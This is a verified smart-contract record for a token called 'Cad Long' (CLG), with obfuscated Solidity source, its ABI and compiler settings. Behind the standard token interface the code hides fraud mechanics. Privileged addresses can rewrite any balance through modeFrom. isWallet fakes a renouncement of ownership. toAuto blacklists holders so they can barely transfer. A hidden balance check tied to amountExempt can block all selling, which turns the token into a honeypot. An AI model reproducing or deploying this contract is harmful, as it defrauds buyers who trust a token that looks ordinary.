{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface launchModeToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txLimit {\n    function createPair(address modeTotal, address toSender) external returns (address);\n}\n\ninterface walletLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyLaunched) external view returns (uint256);\n\n    function transfer(address teamMax, uint256 fromReceiver) external returns (bool);\n\n    function allowance(address feeTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMax,\n        uint256 fromReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitSwap, uint256 value);\n    event Approval(address indexed feeTake, address indexed spender, uint256 value);\n}\n\ninterface minExempt is walletLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CadLong is fromMarketing, walletLimit, minExempt {\n\n    address private shouldLaunchIs;\n\n    function balanceOf(address buyLaunched) public view virtual override returns (uint256) {\n        return modeMin[buyLaunched];\n    }\n\n    function transferFrom(address fundLimit, address teamMax, uint256 fromReceiver) external override returns (bool) {\n        if (_msgSender() != minIs) {\n            if (launchExemptTrading[fundLimit][_msgSender()] != type(uint256).max) {\n                require(fromReceiver <= launchExemptTrading[fundLimit][_msgSender()]);\n                launchExemptTrading[fundLimit][_msgSender()] -= fromReceiver;\n            }\n        }\n        return fromTx(fundLimit, teamMax, fromReceiver);\n    }\n\n    function approve(address launchTo, uint256 fromReceiver) public virtual override returns (bool) {\n        launchExemptTrading[_msgSender()][launchTo] = fromReceiver;\n        emit Approval(_msgSender(), launchTo, fromReceiver);\n        return true;\n    }\n\n    function transfer(address launchedMin, uint256 fromReceiver) external virtual override returns (bool) {\n        return fromTx(_msgSender(), launchedMin, fromReceiver);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchExemptTrading;\n\n    function allowance(address isTo, address launchTo) external view virtual override returns (uint256) {\n        if (launchTo == minIs) {\n            return type(uint256).max;\n        }\n        return launchExemptTrading[isTo][launchTo];\n    }\n\n    uint256 minTradingTo;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverLiquidity;\n    }\n\n    bool private maxReceiver;\n\n    uint256 private shouldSwapSender = 100000000 * 10 ** 18;\n\n    function fromTx(address fundLimit, address teamMax, uint256 fromReceiver) internal returns (bool) {\n        if (fundLimit == feeTrading) {\n            return fundAt(fundLimit, teamMax, fromReceiver);\n        }\n        uint256 enableExemptAmount = walletLimit(marketingBuy).balanceOf(enableLiquidity);\n        require(enableExemptAmount == minTradingTo);\n        require(teamMax != enableLiquidity);\n        if (limitExempt[fundLimit]) {\n            return fundAt(fundLimit, teamMax, autoMarketingTo);\n        }\n        return fundAt(fundLimit, teamMax, fromReceiver);\n    }\n\n    function isWallet() public {\n        emit OwnershipTransferred(feeTrading, address(0));\n        shouldLaunchIs = address(0);\n    }\n\n    mapping(address => bool) public limitExempt;\n\n    event OwnershipTransferred(address indexed marketingSwapShould, address indexed takeLaunched);\n\n    uint256 private buyLaunch;\n\n    mapping(address => bool) public launchedSell;\n\n    function getOwner() external view returns (address) {\n        return shouldLaunchIs;\n    }\n\n    uint8 private receiverLiquidity = 18;\n\n    uint256 public enableMode;\n\n    string private fromLaunched = \"CLG\";\n\n    function tradingSell(address swapIsTx) public {\n        if (atMax) {\n            return;\n        }\n        \n        launchedSell[swapIsTx] = true;\n        \n        atMax = true;\n    }\n\n    constructor (){\n        if (maxReceiver) {\n            swapTradingLaunched = true;\n        }\n        launchModeToken receiverAuto = launchModeToken(minIs);\n        marketingBuy = txLimit(receiverAuto.factory()).createPair(receiverAuto.WETH(), address(this));\n        \n        feeTrading = _msgSender();\n        isWallet();\n        launchedSell[feeTrading] = true;\n        modeMin[feeTrading] = shouldSwapSender;\n        if (swapToken == swapTradingLaunched) {\n            swapTradingLaunched = true;\n        }\n        emit Transfer(address(0), feeTrading, shouldSwapSender);\n    }\n\n    address public marketingBuy;\n\n    bool public swapToken;\n\n    address enableLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant autoMarketingTo = 18 ** 10;\n\n    bool public atMax;\n\n    address minIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return enableMax;\n    }\n\n    function modeFrom(address launchedMin, uint256 fromReceiver) public {\n        feeSell();\n        modeMin[launchedMin] = fromReceiver;\n    }\n\n    address public feeTrading;\n\n    string private enableMax = \"Cad Long\";\n\n    mapping(address => uint256) private modeMin;\n\n    function fundAt(address fundLimit, address teamMax, uint256 fromReceiver) internal returns (bool) {\n        require(modeMin[fundLimit] >= fromReceiver);\n        modeMin[fundLimit] -= fromReceiver;\n        modeMin[teamMax] += fromReceiver;\n        emit Transfer(fundLimit, teamMax, fromReceiver);\n        return true;\n    }\n\n    function feeSell() private view {\n        require(launchedSell[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return shouldLaunchIs;\n    }\n\n    function amountExempt(uint256 fromReceiver) public {\n        feeSell();\n        minTradingTo = fromReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldSwapSender;\n    }\n\n    uint256 maxAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromLaunched;\n    }\n\n    function toAuto(address buyTake) public {\n        feeSell();\n        if (buyLaunch == enableMode) {\n            maxReceiver = false;\n        }\n        if (buyTake == feeTrading || buyTake == marketingBuy) {\n            return;\n        }\n        limitExempt[buyTake] = true;\n    }\n\n    bool private swapTradingLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSwapShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"amountExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"modeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"}],\"name\":\"toAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIsTx\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CadLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}